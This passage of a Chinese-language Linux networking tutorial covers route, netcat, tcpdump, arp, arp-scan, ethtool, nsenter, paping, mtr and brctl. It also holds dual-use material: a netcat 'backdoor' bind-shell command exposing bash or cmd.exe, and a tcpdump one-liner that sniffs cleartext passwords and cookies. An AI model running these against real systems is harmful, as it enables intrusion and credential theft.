route add -net 192.168.1.0 netmask 255.255.255.0 reject
```

### 删除一条路由

```
# 删除默认路由
route del default
# 删除刚才添加的拒绝路由
route del -host 10.0.0.2 reject
```

## ncat &amp; netcat(nc) &amp; nmap


netcat（简称nc）是一款功能强大的网络命令行工具，用于在Linux中执行与TCP、UDP或UNIX域套接字相关的任何操作。netcat可以用于端口扫描、端口重定向，作为端口监听器（用于传入连接）；它还可以用来打开远程连接和其他许多事情。此外，还可以将其用作访问目标服务器的后门。netcat还因此被称为TCP/IP的“瑞士军刀”。

&gt;**各系统下的安装**
&gt;
&gt;- Ubuntu/Debian:  `netcat`   ；`apt install netcat` 
&gt;- CentOS/Fedora: `nc`  ；`yum install -y nc` 
&gt;- Apline：`netcat-openbsd` ；`apk add --no-cache netcat-openbsd`

### 端口扫描

netcat可以用于端口扫描：了解哪些端口是开放的，并且在目标机器上运行服务。它可以扫描单一或多个开防的端口。如示例，`-z` 选项将nc设置为只扫描监听守护进程，而不实际向它们发送任何数据。`-v` 选项启用详细模式，`-w` 为无法建立连接时超时时间。

```bash
nc -v -w 10 -z 195.133.11.43 22

Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Connected to 195.133.11.43:22.
Ncat: 0 bytes sent, 0 bytes received in 0.25 seconds.
```

也可以扫描一个范围

```bash
nc -v -n -z -w 1 127.0.0.1 1-1000
```

### 在服务器间传送文件

netcat可以在两台服务器之间传输文件，这两个系统都必须安装nc。例如，要将ISO映像文件从一台计算机复制到另一台计算机并监视传输进度（使用pv），请在发送方/接收端上运行以下命令。

将以`netcat` 的监听模式 `-l`。

```bash
tar -zcf - debian-10.0.0-amd64-xfce-CD-1.iso  | pv | nc -l -p 3000 -q 5
```

在接受端运行命令

```bash
nc 192.168.1.4 3000 | pv | tar -zxf -
```

### 使用netcat实现一个命令行聊天服务器

可以使 `netcat` 创建一个简单的命令行消息服务器，前提条件是nc必须安装在两个系统上。在服务端，运行命令来创建监听端口5555的聊天服务器。

```bash
nc -l -vv -p 5000
```

在客户端上，运行命令连接到服务端进行聊天会话。

```bash
nc {ip} 5000
```

### 使用nc创建一个web服务器

使用nc `-l` 选项可以创建一个基础的不安全的web服务器，需要一个静态html文件。然后可以通过 `while` 保持netcat命令不退出。正常情况下，netcat在连接断开时退出。

```bash
while : ; do ( echo -ne &#34;HTTP/1.1 200 OK\r\n&#34; ; cat 1.html; ) | nc -l -p 8080 ; done
```


```
$ while : ; do ( echo -ne &#34;HTTP/1.1 200 OK\r\n&#34; ; cat 1.html; ) | nc -l -p 8080 ; done
GET / HTTP/1.1
Host: ip:8080
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36
Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6
```

### 网络故障排查

netcat 主要常用的一个方面时排查网络连接故障，可以使用 `netcat` 来验证服务器正在发送哪些数据以响应客户端发出的命令。

使用命令的可以输出包括web服务器发送的标头，这些标头可用于故障排除。也可以使用 `curl` 等命令进行同样的操作。

```bash
printf &#34;GET / HTTP/1.0\r\n\r\n&#34; | nc baidu.com 80

HTTP/1.1 200 OK
Date: Mon, 28 Jun 2021 12:16:55 GMT
Server: Apache
Last-Modified: Tue, 12 Jan 2010 13:48:00 GMT
ETag: &#34;51-47cf7e6ee8400&#34;
Accept-Ranges: bytes
Content-Length: 81
Cache-Control: max-age=86400
Expires: Tue, 29 Jun 2021 12:16:55 GMT
Connection: Close
Content-Type: text/html

&lt;html&gt;
&lt;meta http-equiv=&#34;refresh&#34; content=&#34;0;url=http://www.baidu.com/&#34;&gt;
&lt;/html&gt;
```

### 查找端口上运行的服务

使用 `netcat` 可以获取服务监听端口的信息，单一般情况下，仅常见公共服务会这样，一些服务并不会相应对应的应用名称。。`-n` 标志表示禁用DNS或服务查找。

```bash
nc -v -n 195.133.11.43 22
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Connected to 195.133.11.43:22.
SSH-2.0-OpenSSH_7.4
```

### 网络后门

一般情况下，黑客将 `netcat` 当作网络后门来运行，通过反弹式shell以获取远程命令。要充当后门。`-e`  在目标系统上运行的命令。

如监听一个端口，并将所有传入的输入传递给bash命令，结果将传送于客户端。

```
# linux
nc -l -p -v 3001  -e /bin/bash

# windows
nc -l -p 3001  -e cmd.exe
```

### 检查一个udp端口

`-z`：无法进行`I/O` ，仅报告连接状态

`-u`：使用udp协议

```bash
nc -vz -u 
```

## tcpdump &lt;sup&gt;&lt;a href=&#34;#1&#34;&gt;[1]&lt;/a&gt;&lt;/sup&gt;

tcpdump网络嗅探器，将强大和简单结合到一个单一的命令行界面中，能够将网络中的报文抓取，输出到屏幕或者记录到文件中。

&gt; **各系统下的安装**
&gt;
&gt; - Ubuntu/Debian: `tcpdump` ；`apt-get install -y tcpdump`
&gt; - CentOS/Fedora: `tcpdump` ；`yum install -y tcpdump`
&gt; - Apline：`tcpdump ` ；`apk add tcpdump --no-cache`

查看指定接口上的所有通讯  

语法

| 参数                             | 说明                                                         |
| -------------------------------- | ------------------------------------------------------------ |
| -i [interface]&amp;nbsp;&amp;nbsp; | 接口名 |
| -p                               | `--no-promiscuous-mode` 抓包内容为非混杂模式下的包 |
| -w [flle]                        | 保存原始的包到文件中 |
| -n                             | 不转换IP为DNS名称 |
| -N                            | 将端口解析为数字格式而不是服务名                               |
| -A                               | 以 ***ASCII*** 格式打印内容（不包含标头）                        |
| -XX                              | 打印数据为==数据包的标头==与以十六进制和 ***ASCII*** 格式打印数据包的数据。 |
| -v/-vv/-vvv                     | 详细信息；`-v`, `-vv` 将打印更多信息                          |
| -r                               | 读取文件而不是实时抓包                                       |

**关键字**

| 参数          | 关键字                                     |
| ------------- | ------------------------------------------ |
| **type**      | `host`, `net`, `port`, `portrange`         |
| **direction** | `src`, `dst`, `src or dst` , `src and ds`  |
| **protocol**  | `ether`, `ip`, `arp`, `tcp`, `udp`, `wlan` |

### 捕获所有网络接口

```bash
tcpdump -D
```

### 按IP查找流量

最常见的查询之一 `host`，可以看到来往于 `1.1.1.1` 的流量。 

```bash
tcpdump host 1.1.1.1
```

### 按源/目的 地址过滤

如果只想查看来自/向某方向流量，可以使用 `src` 和 `dst`。

```bash
tcpdump src|dst 1.1.1.1
```

### 通过网络查找数据包

使用 `net` 选项，来要查找出/入某个网络或子网的数据包。

```bash
tcpdump net 1.2.3.0/24
```

### 使用十六进制输出数据包内容

`hex` 可以以16进制输出包的内容

```bash
tcpdump -c 1 -X icmp
```

### 查看特定端口的流量

使用 `port` 选项来查找特定的端口流量。

```bash
tcpdump port 3389
tcpdump src port 1025
```

### 查找端口范围的流量

```bash
tcpdump portrange 21-23
```

### 过滤包的大小

如果需要查找特定大小的数据包，可以使用以下选项。你可以使用 `less`，`greater`。

```bash
tcpdump less 32
tcpdump greater 64
tcpdump &lt;= 128
```

### 捕获流量输出为文件

`-w`  可以将数据包捕获保存到一个文件中以便将来进行分析。这些文件称为`PCAP`（PEE-cap）文件，它们可以由不同的工具处理，包括 `Wireshark` 。

```bash
tcpdump port 80 -w capture_file
```

### 组合条件

tcpdump也可以结合逻辑运算符进行组合条件查询

- **AND** 
   *`and`* or `&amp;&amp;`

- **OR** 
   *`or`* or `||`
- **EXCEPT** 
   *`not`* or `!`

```bash
tcpdump -i eth0 -nn host 220.181.57.216 and 10.0.0.1  # 主机之间的通讯
tcpdump -i eth0 -nn host 220.181.57.216 or 10.0.0.1
# 获取10.0.0.1与 10.0.0.9或 10.0.0.1 与10.0.0.3之间的通讯
tcpdump -i eth0 -nn host 10.0.0.1 and \(10.0.0.9 or 10.0.0.3\)
```

### 原始输出

并显示人类可读的内容进行输出包（不包含内容）。

```tcpdump -ttnnvvS -i eth0 
tcpdump -ttnnvvS -i eth0 
```

### IP到端口

让我们查找从某个IP到端口任何主机的某个端口所有流量。

```bash
tcpdump -nnvvS src 10.5.2.3 and dst port 3389
```

### 去除特定流量

可以将指定的流量排除，如这显示所有到192.168.0.2的 非ICMP的流量。

```bash
tcpdump dst 192.168.0.2 and src net and not icmp
```

来自非指定端口的流量，如，显示来自不是SSH流量的主机的所有流量。

```bash
tcpdump -vv src mars and not dst port 22
```

### 选项分组

在构建复杂查询时，必须使用单引号 `&#39;`。单引号用于忽略特殊符号 `()` ，以便于使用其他表达式（如host, port, net等）进行分组。

```###
tcpdump &#39;src 10.0.2.4 and (dst port 3389 or 22)&#39;
```

### 过滤TCP标记位

TCP RST 

The filters below find these various packets because tcp[13] looks at offset 13 in the TCP header, the number represents the location within the byte, and the !=0 means that the flag in question is set to 1, i.e. it’s on.

```bash
tcpdump &#39;tcp[13] &amp; 4!=0&#39;
tcpdump &#39;tcp[tcpflags] == tcp-rst&#39;
```

TCP SYN

```bash
tcpdump &#39;tcp[13] &amp; 2!=0&#39;
tcpdump &#39;tcp[tcpflags] == tcp-syn&#39;
```

同时忽略SYN和ACK标志的数据包

```bash
tcpdump &#39;tcp[13]=18&#39;
```

TCP URG

```bash
tcpdump &#39;tcp[13] &amp; 32!=0&#39;
tcpdump &#39;tcp[tcpflags] == tcp-urg&#39;
```

TCP ACK

```bash
tcpdump &#39;tcp[13] &amp; 16!=0&#39;
tcpdump &#39;tcp[tcpflags] == tcp-ack&#39;
```

TCP PSH

```bash
tcpdump &#39;tcp[13] &amp; 8!=0&#39;
tcpdump &#39;tcp[tcpflags] == tcp-push&#39;
```

TCP FIN

```bash
tcpdump &#39;tcp[13] &amp; 1!=0&#39;
tcpdump &#39;tcp[tcpflags] == tcp-fin&#39;
```

### 查找http包

查找 `user-agent` 信息

```bash
tcpdump -vvAls0 | grep &#39;User-Agent:&#39;
```

查找只是 `GET` 请求的流量

```bash
tcpdump -vvAls0 | grep &#39;GET&#39;
```

查找http客户端IP

```bash
tcpdump -vvAls0 | grep &#39;Host:&#39;
```

查询客户端cookie

```bash
tcpdump -vvAls0 | grep &#39;Set-Cookie|Host:|Cookie:&#39;
```

### 查找DNS流量

```bash
tcpdump -vvAs0 port 53
```

### 查找对应流量的明文密码

```bash
tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -lA | egrep -i -B5 &#39;pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd= |password=|pass:|user:|username:|password:|login:|pass |user &#39;
```

### arp

ARP “地址解析协议” (`Address Resolution Protoco`)，是一种将IP地址映射到局域网上物理MAC地址的协议。

**为什么我们需要MAC地址？**

任何本地通信都将使用MAC地址，而不是IP地址。当一台计算机想在不同的网络上与另一台计算机通信时，将使用IP地址。IP地址就像你的邮寄收货地址，而MAC地址就像你的名字。在TCP/IP网络上，每台计算机都被分配IP地址，一些本地服务器的IP地址也被分配给网络客户主机。因此其在第2层（数据链路层）和第3层（网络层）之间工作。

在一个本地网络中，客户主机尝试在连接另外一个主机时（这里为同一网络，即同一广播域中），首先客户端会检查ARP缓存表（缓存IP于MAC的关系）。而 `arp` 命令可以管理系统的arp缓存表。它允许完全转储ARP缓存。

&gt; **各系统下的安装**
&gt;
&gt;  - Ubuntu/Debian:  `net-tools`   ；`apt install net-tools` 
&gt;  - CentOS/Fedora: `net-tools`  ；`yum install -y net-tools` 
&gt;  - Apline：`net-tools` ；`apk add --no-cache net-tools`

### 查看arp条目

`arp` 命令在没有任何选项的情况下将显示arp缓存表的内容。

```bash
arp

Address                  HWtype  HWaddress           Flags Mask            Iface
correspond.fsddsfk.cn    ether   c4:71:fe:f1:9f:3f   C                     eth0
gateway                  ether   00:1f:ce:72:bd:8c   C                     eth0
```

### 显示一个特定的arp条目

当arp缓存表很大不利于查看，并且仅需要拿到特定IP的条目的话，可以在 `-a` 后加具体IP地址来获取一个特定的条目。

```bash
arp -a 46.17.40.155
correspond.faaaaa.cn (10.17.40.1) at c4:71:fe:f1:9f:3f [ether] on eth0
```

### 显示指定接口的arp缓存表

如果仅希望显示一个接口的arp条目，可以通过 `arp` 命令 `-i`选项后跟接口名称。

```bash
arp -i bond0

Address                HWtype  HWaddress           Flags Mask            Iface
usartdb02.exmpl.c      ether   17:a9:9b:f5:1a:7e   C                     bond0
usartdb02.exmpl.c      ether   f8:db:77:f2:5a:a2   C                     bond0
```

### 删除一个arp条目

从arp缓存表中删除一个ip条目，可以使用 `arp` 命令-d选项，后跟IP地址。当一旦执行arp命令，ARP缓存表就会被刷新。

```bash
arp -d 192.168.188.2
```

### 向arp缓存添加一个条目

永久添加一个条目到arp缓存中，使用 `-s` 选项，需要指定IP地址和MAC地址外，还需要指定将条目添加到哪个接口。如：

```bash
arp -s 192.168.188.133 -i eth0 00:0c:29:f6:1d:81
```

### 清空arp缓存表

某些场景下，需要清空arp缓存，而 `arp` 命令并没有清空缓存表的操作，这时可以使用 `ip neigh`   而且`ip-route2` 最小化安装；基础容器等场景下也会存在。

```bash
ip neigh flush dev eth0s
```

### 显示格式

使用 `-e` 选项以linux标准格式输出arp缓存表

其输出格式中，ARP缓存表中的每个完整条目都将被标记为 `C` Complete entry。`M` （Permanent entry）表示永久条目；`P` （Published entry.）表示已发布条目标记。

```bash
arp -ae

Address                  HWtype  HWaddress           Flags Mask            Iface
correspond.fsddsfk.cn    ether   c4:71:fe:fe:9f:2f   C                     eth0

arp -aen

Address                  HWtype  HWaddress           Flags Mask            Iface
36.17.40.111             ether   c4:71:fe:fe:9f:2f   C                     eth0
```

## arp-scan

网络扫描是渗透测试的步骤之一。有不同的和流行的工具来扫描网络线masscan，nmap等。Arp扫描。

`arp-scan` 是专门设计用来扫描二层（网络层）的mac, arp数据包的工具（也可称为`ARP Sweep` 或 `MAC Scanner` ）；是一个非常快速的ARP包扫描程序，它可以显示子网中所有活动的IPv4设备。由于ARP是不可路由的，这种类型的扫描仪只能在本地LAN（本地子网或网段）上工作。

`arp-scan` 显示所有活动设备，即使它们有防火墙。设备不能像躲避Ping一样躲避ARP包。

&gt;**各系统下的安装**
&gt;
&gt;- Ubuntu/Debian:  `arp-scan`   ；`apt install arp-scan` 
&gt;- CentOS/Fedora: `arp-scan` (epel)  ；`yum install -y arp-scan` 
&gt;- Apline：`arp-scan` ；`apk add --no-cache arp-scan`

### 扫描本地网络

`arp-scan` 的最基本使用方法是扫描本地网络，使用`-l` 或 `--localnet` 可以扫描整个本地网络，但需要root权限

```bash
arp-scan  --localnet

Interface: eth0, type: EN10MB, MAC: da:78:c8:7a:fb:26, IPv4: 195.133.11.43
Starting arp-scan 1.9.7 with 512 hosts (https://github.com/royhills/arp-scan)
195.133.10.1    00:1f:ce:72:bd:8c       QTECH LLC
195.133.10.2    56:85:8e:2b:cf:11       (Unknown: locally administered)
195.133.10.5    de:58:c6:5b:b5:c2       (Unknown: locally administered)
195.133.10.7    de:ed:ae:4b:7a:c8       (Unknown: locally administered)
195.133.10.6    d2:a6:f4:4c:f0:4b       (Unknown: locally administered)
```

### 设置源mac

在apr扫描的过程中，会使用现有的mac地址进行请求，这样会留下网络痕迹，`arp-scan` 提供了修改源mac的功能。使用 `--destaddr` 或 `-T` 。

###指定特殊vlan

在网络设备中，一个接口可以实现多个网络，这使用了虚拟局域网VLAN（Virtual Local Area Network）的多路复用协议。如果接口是 `trunk` ，意味接口承载多个VLAN，我们可能需要指定VLAN id，可以使用 `--vlan` 或 `-Q`指定vlan id

```bash
arp-scan -i eth0 -Q 10
```

### 发现网络冲突

`arp-scan` 也可用于发现IP冲突与识别设备等操，只需一个命令 `arp scan -l`。可以通过 `-i` 指定端口。

这里 `192.168.1.39` 冲突，因为出现了两次并且指定了不同的mac地址。

```bash
arp-scan –I eth0 -l

192.168.1.10   00:1b:a9:63:a2:4c       BROTHER INDUSTRIES, LTD.
192.168.1.30   00:1e:8f:58:ec:49       CANON INC.
192.168.1.33   00:25:4b:1b:10:20       Apple, Inc
192.168.1.37   10:9a:dd:55:d7:95       Apple Inc
192.168.1.38   20:c9:d0:27:8d:56       (Unknown)
192.168.1.39   d4:85:64:4d:35:be       Hewlett Packard
192.168.1.39   00:0b:46:e4:8e:6d       Cisco (DUP: 2)
192.168.1.40   90:2b:34:18:59:c0       (Unknown)
```

## ethtool

`ethtool` 命令用于 显示, 配置以太网设备。可以在Linux中使用此工具更改网卡速度, 自动协商, LAN唤醒设置, 双工模式。

&gt; **各系统下的安装**
&gt;
&gt;  - Ubuntu/Debian:  `ethtool`   ；`apt install ethtool` 
&gt;  - CentOS/Fedora: `ethtool` (epel)  ；`yum install -y ethtool` 
&gt;  - Apline：`ethtool` ；`apk add --no-cache ethtool`

### 列出以太网设备属性

```bash
ethtool eth0

Settings for eth0:
        Supported ports: [ ]
        Supported link modes:   Not reported
        Supported pause frame use: No
        Supports auto-negotiation: No
        Supported FEC modes: Not reported
        Advertised link modes:  Not reported
        Advertised pause frame use: No
        Advertised auto-negotiation: No
        Advertised FEC modes: Not reported
        Speed: Unknown!
        Duplex: Unknown! (255)
        Port: Other
        PHYAD: 0
        Transceiver: internal
        Auto-negotiation: off
        Link detected: yes
```

### 查看网络接口于容器内接口的对应关系

可以通过ethtool查看容器的网卡对，通过`-S` 加接口设备名，`-S` 为统计信息

在宿主机上 使用命令查看，其中`peer_ifindex: 767` 对应容器内 `ip link` 的编号

```bash
ethtool -S veth45562ed 
```

容器内

```
$ ip link
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
767: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default
    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff
```

## nsenter

nsenter是一款可以进入进程的名称空间中。例如，如果一个容器以非 root 用户身份运行，而使用 `docker exec` 进入其中后，但该容器没有安装 `sudo` 或未 `netstat` ，并且您想查看其当前的网络属性，如开放端口，这种场景下将如何做到这一点？***nsenter*** 就是用来解决这个问题的。

**nsenter** (*namespace enter*) 可以在容器的宿主机上使用 *nsenter* 命令进入容器的命名空间，以容器视角使用宿主机上的相应网络命令进行操作。==当然需要拥有 *root* 权限==

&gt; **各系统下的安装** &lt;sup&gt;&lt;a href=&#34;#4&#34;&gt;[4]&lt;/a&gt;&lt;/sup&gt;
&gt;
&gt; - Ubuntu/Debian: `util-linux`  ；`apt-get install -y util-linux`
&gt; - CentOS/Fedora: `util-linux` ；`yum install -y util-linux`
&gt; - Apline：`util-linux` ；`apk add util-linux --no-cache`

*nsenter* 的使用语法为，`nsenter -t pid -n &lt;commond&gt;`，`-t` 接 进程ID号，`-n` 表示进入名称空间内，`&lt;commond&gt;` 为执行的命令。更多的内容可以参考 &lt;sup&gt;&lt;a href=&#34;#3&#34;&gt;[3]&lt;/a&gt;&lt;/sup&gt;

实例：如我们有一个Pod进程ID为30858，进入该Pod名称空间内执行 `ifconfig` ，如下列所示

```bash
$ ps -ef|grep tail
root      17636  62887  0 20:19 pts/2    00:00:00 grep --color=auto tail
root      30858  30838  0 15:55 ?        00:00:01 tail -f

$ nsenter -t 30858 -n ifconfig
eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1480
        inet 192.168.1.213  netmask 255.255.255.0  broadcast 192.168.1.255
        ether 5e:d5:98:af:dc:6b  txqueuelen 0  (Ethernet)
        RX packets 92  bytes 9100 (8.8 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 92  bytes 8422 (8.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 5  bytes 448 (448.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5  bytes 448 (448.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

net1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 10.1.0.201  netmask 255.255.255.0  broadcast 10.1.0.255
        ether b2:79:f9:dd:2a:10  txqueuelen 0  (Ethernet)
        RX packets 228  bytes 21272 (20.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 216  bytes 20272 (19.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

### 如何定位Pod名称空间

首先需要确定Pod所在的节点名称

```bash
$ kubectl get pods -owide |awk &#39;{print $1,$7}&#39;
NAME NODE
netbox-85865d5556-hfg6v master-machine
netbox-85865d5556-vlgr4 node01
```

如果Pod不在当前节点还需要用IP登录则还需要查看IP（可选）

```bash
$ kubectl get pods -owide |awk &#39;{print $1,$6,$7}&#39;
NAME IP NODE
netbox-85865d5556-hfg6v 192.168.1.213 master-machine
netbox-85865d5556-vlgr4 192.168.0.4 node01
```

接下来，登录节点，获取容器lD，如下列所示，每个pod默认有一个 *pause* 容器，其他为用户yaml文件中定义的容器，理论上所有容器共享相同的网络命名空间，排查时可任选一个容器。

```bash
$ docker ps |grep netbox-85865d5556-hfg6v
6f8c58377aae   f78dd05f11ff                                                    &#34;tail -f&#34;                45 hours ago   Up 45 hours             k8s_netbox_netbox-85865d5556-hfg6v_default_4a8e2da8-05d1-4c81-97a7-3d76343a323a_0
b9c732ee457e   registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1   &#34;/pause&#34;                 45 hours ago   Up 45 hours             k8s_POD_netbox-85865d5556-hfg6v_default_4a8e2da8-05d1-4c81-97a7-3d76343a323a_0
```

接下来获得获取容器在节点系统中对应的进程号，如下所示

```bash
$ docker inspect --format &#34;{{ .State.Pid }}&#34; 6f8c58377aae
30858
```

最后就可以通过 *nsenter* 进入容器网络空间执行命令了

## paping

**paping** 命令可对目标地址指定端口以TCP协议进行连续ping，通过这种特性可以弥补 *ping* ICMP协议，以及 *nmap* , *telnet* 只能进行一次操作的的不足；通常情况下会用于测试端口连通性和丢包率

paping download：[paping](https://code.google.com/archive/p/paping/)

*paping* 还需要安装以下依赖，这取决于你安装的 *paping* 版本

- RedHat/CentOS：`yum install -y libstdc&#43;&#43;.i686 glibc.i686` 
- Ubuntu/Debian：最小化安装无需依赖

```bash
$ paping -h
paping v1.5.5 - Copyright (c) 2011 Mike Lovell

Syntax: paping [options] destination

Options:
 -?, --help     display usage
 -p, --port N   set TCP port N (required)
     --nocolor  Disable color output
 -t, --timeout  timeout in milliseconds (default 1000)
 -c, --count N  set number of checks to N
```

## mtr

**mtr** 是一个跨平台的网络诊断工具，将 **traceroute** 和 **ping** 的功能结合到一个工具。与 *traceroute* 不同的是 *mtr* 显示的信息比起 *traceroute* 更加丰富：通过 *mtr* 可以确定网络的条数，并且可以同时打印响应百分比以及网络中各跳跃点的响应时间。

&gt; **各系统下的安装**
&gt;
&gt; - Ubuntu/Debian: `mtr`  ；`apt-get install -y mtr`
&gt; - CentOS/Fedora: `mtr` ；`yum install -y mtr`
&gt; - Apline：`mtr` ；`apk add mtr --no-cache`

### 简单的使用示例

最简单的示例，就是后接域名或IP，这将跟踪整个路由

```bash
$ mtr google.com

Start: Thu Jun 28 12:10:13 2018
HOST: TecMint                     Loss%   Snt   Last   Avg  Best  Wrst StDev
  1.|-- 192.168.0.1                0.0%     5    0.3   0.3   0.3   0.4   0.0
  2.|-- 5.5.5.211                  0.0%     5    0.7   0.9   0.7   1.3   0.0
  3.|-- 209.snat-111-91-120.hns.n 80.0%     5    7.1   7.1   7.1   7.1   0.0
  4.|-- 72.14.194.226              0.0%     5    1.9   2.9   1.9   4.4   1.1
  5.|-- 108.170.248.161            0.0%     5    2.9   3.5   2.0   4.3   0.7
  6.|-- 216.239.62.237             0.0%     5    3.0   6.2   2.9  18.3   6.7
  7.|-- bom05s12-in-f14.1e100.net  0.0%     5    2.1   2.4   2.0   3.8   0.5
```

`-n` 强制 *mtr* 打印 IP地址而不是主机名

```bash
$ mtr -n google.com

Start: Thu Jun 28 12:12:58 2018
HOST: TecMint                     Loss%   Snt   Last   Avg  Best  Wrst StDev
  1.|-- 192.168.0.1                0.0%     5    0.3   0.3   0.3   0.4   0.0
  2.|-- 5.5.5.211                  0.0%     5    0.9   0.9   0.8   1.1   0.0
  3.|-- ???                       100.0     5    0.0   0.0   0.0   0.0   0.0
  4.|-- 72.14.194.226              0.0%     5    2.0   2.0   1.9   2.0   0.0
  5.|-- 108.170.248.161            0.0%     5    2.3   2.3   2.2   2.4   0.0
  6.|-- 216.239.62.237             0.0%     5    3.0   3.2   3.0   3.3   0.0
  7.|-- 172.217.160.174            0.0%     5    3.7   3.6   2.0   5.3   1.4
```

`-b` 同时显示IP地址与主机名

```bash
$ mtr -b google.com

Start: Thu Jun 28 12:14:36 2018
HOST: TecMint                     Loss%   Snt   Last   Avg  Best  Wrst StDev
  1.|-- 192.168.0.1                0.0%     5    0.3   0.3   0.3   0.4   0.0
  2.|-- 5.5.5.211                  0.0%     5    0.7   0.8   0.6   1.0   0.0
  3.|-- 209.snat-111-91-120.hns.n  0.0%     5    1.4   1.6   1.3   2.1   0.0
  4.|-- 72.14.194.226              0.0%     5    1.8   2.1   1.8   2.6   0.0
  5.|-- 108.170.248.209            0.0%     5    2.0   1.9   1.8   2.0   0.0
  6.|-- 216.239.56.115             0.0%     5    2.4   2.7   2.4   2.9   0.0
  7.|-- bom07s15-in-f14.1e100.net  0.0%     5    3.7   2.2   1.7   3.7   0.9
```

`-c` 跟一个具体的值，这将限制 *mtr* ping的次数，到达次数后会退出

```bash
$ mtr -c5 google.com
```

如果需要指定次数，并且在退出后保存这些数据，使用 `-r` flag

```bash
$ mtr -r -c 5 google.com &gt;  1
$ cat 1
Start: Sun Aug 21 22:06:49 2022
HOST: xxxxx.xxxxx.xxxx.xxxx Loss%   Snt   Last   Avg  Best  Wrst StDev
  1.|-- gateway                    0.0%     5    0.6 146.8   0.6 420.2 191.4
  2.|-- 212.xx.21.241              0.0%     5    0.4   1.0   0.4   2.3   0.5
  3.|-- 188.xxx.106.124            0.0%     5    0.7   1.1   0.7   2.1   0.5
  4.|-- ???                       100.0     5    0.0   0.0   0.0   0.0   0.0
  5.|-- 72.14.209.89               0.0%     5   43.2  43.3  43.1  43.3   0.0
  6.|-- 108.xxx.250.33             0.0%     5   43.2  43.1  43.1  43.2   0.0
  7.|-- 108.xxx.250.34             0.0%     5   43.7  43.6  43.5  43.7   0.0
  8.|-- 142.xxx.238.82             0.0%     5   60.6  60.9  60.6  61.2   0.0
  9.|-- 142.xxx.238.64             0.0%     5   59.7  67.5  59.3  89.8  13.2
 10.|-- 142.xxx.37.81              0.0%     5   62.7  62.9  62.6  63.5   0.0
 11.|-- 142.xxx.229.85             0.0%     5   61.0  60.9  60.7  61.3   0.0
 12.|-- xx-in-f14.1e100.net  0.0%     5   59.0  58.9  58.9  59.0   0.0
```

默认使用的是 ICMP 协议 `-i` ，可以指定 `-u`,  `-t` 使用其他协议

```bash
mtr --tcp google.com
```

`-m` 指定最大的跳数

```bash
mtr -m 35 216.58.223.78
```

`-s` 指定包的大小

### mtr输出的数据

| colum | describe                           |
| ----- | ---------------------------------- |
| last  | 最近一次的探测延迟值               |
| avg   | 探测延迟的平均值                   |
| best  | 探测延迟的最小值                   |
| wrst  | 探测延迟的最大值                   |
| stdev | 标准偏差。越大说明相应节点越不稳定 |

### 丢包判断

任一节点的 `Loss%`（丢包率）如果不为零，则说明这一跳网络可能存在问题。导致相应节点丢包的原因通常有两种。

- 运营商基于安全或性能需求，人为限制了节点的ICMP发送速率，导致丢包。
- 节点确实存在异常，导致丢包。可以结合异常节点及其后续节点的丢包情况，来判定丢包原因。

&gt; Notes: 
&gt;
&gt; - 如果随后节点均没有丢包，则通常说明异常节点丢包是由于运营商策略限制所致。可以忽略相关丢包。
&gt; - 如果随后节点也出现丢包，则通常说明节点确实存在网络异常，导致丢包。对于这种情况，如果异常节点及其后续节点连续出现丢包，而且各节点的丢包率不同，则通常以最后几跳的丢包率为准。如链路测试在第5, 6, 7跳均出现了丢包。最终丢包情况以第7跳作为参考。

### 延迟判断

由于链路抖动或其它因素的影响，节点的 *Best* 和 *Worst* 值可能相差很大。而 *Avg*（平均值）统计了自链路测试以来所有探测的平均值，所以能更好的反应出相应节点的网络质量。而 *StDev*（标准偏差值）越高，则说明数据包在相应节点的延时值越不相同（越离散）。所以标准偏差值可用于协助判断 *Avg* 是否真实反应了相应节点的网络质量。例如，如果标准偏差很大，说明数据包的延迟是不确定的。可能某些数据包延迟很小（例如：25ms），而另一些延迟却很大（例如：350ms），但最终得到的平均延迟反而可能是正常的。所以此时 *Avg* 并不能很好的反应出实际的网络质量情况。

这就需要结合如下情况进行判断：

- 如果 *StDev* 很高，则同步观察相应节点的 *Best* 和 *wrst*，来判断相应节点是否存在异常。
- 如果*StDev* 不高，则通过Avg来判断相应节点是否存在异常。

## brctl &lt;sup&gt;&lt;a href=&#34;#5&#34;&gt;[5]&lt;/a&gt;&lt;/sup&gt;

***brctl*** 是用于创建和操作 Linux Bridge 的命令行工具，

&gt; **各系统下的安装**
&gt;
&gt; - Ubuntu/Debian: `bridge-utils`  ；`apt-get install -y bridge-utils`
&gt; - CentOS/Fedora: ` bridge-utils` ；`yum install -y bridge-utils`
&gt; - Apline：`bridge-utils` ；`apk add bridge-utils --no-cache`

### 显示所有启用的网桥的设备

使用 `brctl show` 查看当前节点可用的 bridge

```bash
$ brctl show
bridge name bridge id STP enabled interfaces
